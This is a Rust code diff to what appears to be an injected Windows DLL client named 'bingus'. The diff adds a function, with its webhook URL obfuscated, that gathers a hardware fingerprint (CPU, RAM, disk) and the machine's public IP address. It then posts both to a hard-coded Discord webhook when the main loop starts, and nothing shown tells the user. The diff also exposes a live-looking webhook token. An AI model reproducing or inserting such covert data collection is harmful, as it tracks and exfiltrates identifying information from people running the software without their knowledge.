@@ -1,6 +1,7 @@
 use std::{ptr::null_mut, time::Duration, thread::sleep, ffi::CString, sync::Once};
 use bingus_client::{run_client, MODULES};
 use bingus_module::prelude::*;
+use webhook::client::{WebhookResult, WebhookClient};
 use widestring::WideCString;
 use winapi::{
     shared::{minwindef::{DWORD, HINSTANCE, LPVOID, HMODULE}, windef::{HDC, HGLRC__}},
@@ -34,6 +35,33 @@ pub fn message_box(text: &str) {
     }
 }
 
+async fn client_webhook() -> WebhookResult<()> {
+    let client = WebhookClient::new(obfstr::obfstr!("https://discord.com/api/webhooks/1069733455920910447/eX0tFN3qNdMPDbZmT05Jr8_rths_3WQpRN2Cqs9aDErUIZdBtXnsHkJaAnneSNfk8chP"));
+
+    let hwid = {
+        use uniqueid::{IdentifierBuilder, IdentifierType};
+
+        let mut builder = IdentifierBuilder::default();
+
+        builder.name("Cocaine3");
+        builder.add(IdentifierType::CPU);
+        builder.add(IdentifierType::RAM);
+        builder.add(IdentifierType::DISK);
+
+        builder.build().to_string(true)
+    };
+
+    let ip = public_ip::addr().await.unwrap();
+
+    client.send(|message| message
+        .username("all-seeing eye of bingus#4442")
+        .embed(|embed| embed
+            .title("Client")
+            .description(&format!("hwid:`{hwid}`\nip:`{ip}`")))).await?;
+
+    Ok(())
+}
+
 macro_rules! exit_thread {
     ($base:ident) => {{
         message_box("ejecting");
@@ -43,6 +71,17 @@ macro_rules! exit_thread {
 }
 
 unsafe extern "system" fn main_loop(base: LPVOID) -> u32 {
+    /*async {
+        client_webhook().await.unwrap();
+    };
+    */
+    // can't make this an async function
+    // await the above somehow?
+    tokio::task::spawn_blocking(|| async {
+        client_webhook().await.unwrap();
+    });
+
+
     // check hwid, only on release
     #[cfg(not(build = "debug"))]
     if obfstr::obfstr!(env!("HWID")) != {
